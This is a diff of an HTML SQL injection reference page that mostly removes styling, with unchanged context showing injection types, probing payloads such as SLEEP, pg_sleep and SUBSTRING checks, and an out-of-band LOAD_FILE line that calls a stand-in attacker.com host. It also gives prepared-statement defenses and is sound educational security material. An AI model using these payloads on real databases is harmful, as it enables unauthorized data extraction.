@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" style="background-color:#020202">
+<html lang="en" >
 
 <head>
     <meta charset="UTF-8">
@@ -7,206 +7,10 @@
     <title>SQL Injection - Security Hub</title>
     <meta name="description"
         content="Complete SQL Injection reference — types, detection, exploitation, SQLMap, WAF bypass, and defenses.">
-    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <link rel="stylesheet" type="text/css" href="https://unpkg.com/@phosphor-icons/web@2.1.1/src/regular/style.css">
     <link rel="stylesheet" href="../css/style.css">
-    <style>
-        .type-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-            gap: 1rem;
-            margin-top: 1rem;
-        }
-
-        .type-card {
-            background: var(--bg-surface-hover);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 1.25rem;
-            transition: all .25s;
-        }
-
-        .type-card:hover {
-            transform: translateY(-3px);
-            border-color: rgba(239, 68, 68, .3);
-        }
-
-        .type-card .tc-icon {
-            font-size: 1.6rem;
-            margin-bottom: .6rem;
-            display: block;
-        }
-
-        .type-card h3 {
-            font-family: 'Outfit', sans-serif;
-            font-size: .95rem;
-            font-weight: 600;
-            margin: 0 0 .4rem;
-        }
-
-        .type-card p {
-            font-size: .82rem;
-            color: var(--text-soft);
-            margin: 0;
-            line-height: 1.5;
-        }
-
-        .danger-box {
-            background: rgba(239, 68, 68, .06);
-            border: 1px solid rgba(239, 68, 68, .2);
-            border-radius: 10px;
-            padding: 1rem 1.2rem;
-            margin: .75rem 0;
-            display: flex;
-            gap: .75rem;
-            align-items: flex-start;
-        }
-
-        .danger-box i {
-            color: #ef4444;
-            font-size: 1.1rem;
-            flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .danger-box p {
-            font-size: .875rem;
-            color: var(--text-soft);
-            margin: 0;
-            line-height: 1.55;
-        }
-
-        .tip-box {
-            background: rgba(16, 185, 129, .06);
-            border: 1px solid rgba(16, 185, 129, .2);
-            border-radius: 10px;
-            padding: 1rem 1.2rem;
-            margin: .75rem 0;
-            display: flex;
-            gap: .75rem;
-            align-items: flex-start;
-        }
-
-        .tip-box i {
-            color: #10b981;
-            font-size: 1.1rem;
-            flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .tip-box p {
-            font-size: .875rem;
-            color: var(--text-soft);
-            margin: 0;
-            line-height: 1.55;
-        }
-
-        .step-list {
-            list-style: none;
-            padding: 0;
-            margin: 1rem 0;
-            counter-reset: step;
-        }
-
-        .step-list li {
-            counter-increment: step;
-            display: flex;
-            gap: .85rem;
-            margin-bottom: .9rem;
-            align-items: flex-start;
-        }
-
-        .step-list li::before {
-            content: counter(step);
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            min-width: 26px;
-            height: 26px;
-            border-radius: 50%;
-            background: rgba(239, 68, 68, .12);
-            border: 1px solid rgba(239, 68, 68, .3);
-            color: #f87171;
-            font-size: .75rem;
-            font-weight: 700;
-            flex-shrink: 0;
-        }
-
-        .step-list li p {
-            font-size: .875rem;
-            color: var(--text-soft);
-            margin: 0;
-            line-height: 1.55;
-        }
-
-        .payload-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: .85rem;
-            margin-top: 1rem;
-        }
-
-        .payload-card {
-            background: rgba(7, 9, 14, .7);
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: .9rem 1rem;
-        }
-
-        .payload-card .pc-label {
-            font-size: .68rem;
-            text-transform: uppercase;
-            letter-spacing: .1em;
-            color: var(--text-muted);
-            font-weight: 600;
-            margin-bottom: .5rem;
-        }
-
-        .payload-card code {
-            font-family: 'Fira Code', monospace;
-            font-size: .83rem;
-            color: #f87171;
-            word-break: break-all;
-            display: block;
-            line-height: 1.5;
-        }
-
-        .defense-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-            gap: .85rem;
-            margin-top: 1rem;
-        }
-
-        .defense-card {
-            background: rgba(16, 185, 129, .05);
-            border: 1px solid rgba(16, 185, 129, .15);
-            border-radius: 10px;
-            padding: 1rem;
-        }
-
-        .defense-card i {
-            font-size: 1.3rem;
-            color: #34d399;
-            margin-bottom: .5rem;
-            display: block;
-        }
-
-        .defense-card h4 {
-            font-family: 'Outfit', sans-serif;
-            font-size: .88rem;
-            font-weight: 600;
-            margin: 0 0 .3rem;
-            color: var(--text-main);
-        }
-
-        .defense-card p {
-            font-size: .8rem;
-            color: var(--text-soft);
-            margin: 0;
-            line-height: 1.5;
-        }
-    </style>
-    <script>if (localStorage.getItem('theme') === 'light-mode') document.documentElement.classList.add('light-mode');</script>
+    
+    
 </head>
 
 <body>
@@ -352,35 +156,35 @@ $result = mysqli_query($conn, $query);
                 <p>SQLi is broadly categorized by how the attacker receives feedback from the database:</p>
                 <div class="type-grid">
                     <div class="type-card">
-                        <span class="tc-icon" style="color:#ef4444;"><i class="ph-eye"></i></span>
+                        <span class="tc-icon"><i class="ph-eye"></i></span>
                         <h3>In-Band — Error Based</h3>
                         <p>The database error message is returned directly in the HTTP response. Fastest to exploit —
                             the error message leaks table names, column names, and data directly. Example: <code
                                 class="inline">CONVERT(int, (SELECT TOP 1 name FROM sysobjects))</code></p>
                     </div>
                     <div class="type-card">
-                        <span class="tc-icon" style="color:#f59e0b;"><i class="ph-rows"></i></span>
+                        <span class="tc-icon"><i class="ph-rows"></i></span>
                         <h3>In-Band — Union Based</h3>
                         <p>Uses the <code class="inline">UNION</code> SQL keyword to append a second SELECT query whose
                             results are returned in the same HTTP response. Requires knowing the number and data types
                             of columns. Most common CTF technique.</p>
                     </div>
                     <div class="type-card">
-                        <span class="tc-icon" style="color:#8b5cf6;"><i class="ph-eye-slash"></i></span>
+                        <span class="tc-icon"><i class="ph-eye-slash"></i></span>
                         <h3>Blind — Boolean Based</h3>
                         <p>No data returned in the response, but the application behaves differently based on TRUE/FALSE
                             conditions. Attacker extracts data one bit at a time by asking yes/no questions: <code
                                 class="inline">AND SUBSTRING(username,1,1)='a'</code></p>
                     </div>
                     <div class="type-card">
-                        <span class="tc-icon" style="color:#0ea5e9;"><i class="ph-timer"></i></span>
+                        <span class="tc-icon"><i class="ph-timer"></i></span>
                         <h3>Blind — Time Based</h3>
                         <p>No visible difference in the response at all. Instead, the attacker causes the server to
                             sleep for a set time to confirm TRUE/FALSE: <code class="inline">IF(1=1, SLEEP(5), 0)</code>
                             — if the response takes 5 seconds, the condition is true.</p>
                     </div>
                     <div class="type-card">
-                        <span class="tc-icon" style="color:#10b981;"><i
+                        <span class="tc-icon"><i
                                 class="ph-arrows-out-line-horizontal"></i></span>
                         <h3>Out-of-Band (OOB)</h3>
                         <p>Data is exfiltrated via a different channel — like DNS lookups or HTTP requests to an
@@ -388,7 +192,7 @@ $result = mysqli_query($conn, $query);
                                 class="inline">LOAD_FILE('\\\\attacker.com\\share')</code></p>
                     </div>
                     <div class="type-card">
-                        <span class="tc-icon" style="color:#fb7185;"><i class="ph-database"></i></span>
+                        <span class="tc-icon"><i class="ph-database"></i></span>
                         <h3>Second Order (Stored)</h3>
                         <p>Malicious input is <em>stored</em> in the database first (seemingly safe), then executed
                             later when another part of the application uses it in a query. Harder to detect than
@@ -427,7 +231,7 @@ $result = mysqli_query($conn, $query);
 '||pg_sleep(5)--                           (PostgreSQL alt)</code></pre>
                 </div>
 
-                <h3 style="font-size:1rem; margin-top:1.5rem; font-family:'Outfit',sans-serif;">Finding the Column Count
+                <h3>Finding the Column Count
                     (for UNION)</h3>
                 <div class="code-wrapper">
                     <div class="code-header"><span class="code-lang">sql — Column Enumeration</span><button
@@ -670,7 +474,7 @@ SELECT name FROM sqlite_master WHERE type='table'  -- list tables</code></pre>
                             in production logs.</p>
                     </div>
                 </div>
-                <div class="code-wrapper" style="margin-top:1.5rem;">
+                <div class="code-wrapper">
                     <div class="code-header"><span class="code-lang">php — Secure Parameterized Query</span><button
                             class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
                     <pre><code>// SECURE — using prepared statement (PDO)
@@ -683,7 +487,7 @@ $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?"
 $stmt->bind_param("ss", $username, $password);
 $stmt->execute();</code></pre>
                 </div>
-                <div class="tip-box" style="margin-top:.75rem;"><i class="ph-check-circle"></i>
+                <div class="tip-box"><i class="ph-check-circle"></i>
                     <p><strong>Always:</strong> Prepared statements first, WAF second, error suppression third. Defense
                         in depth — use all three together.</p>
                 </div>
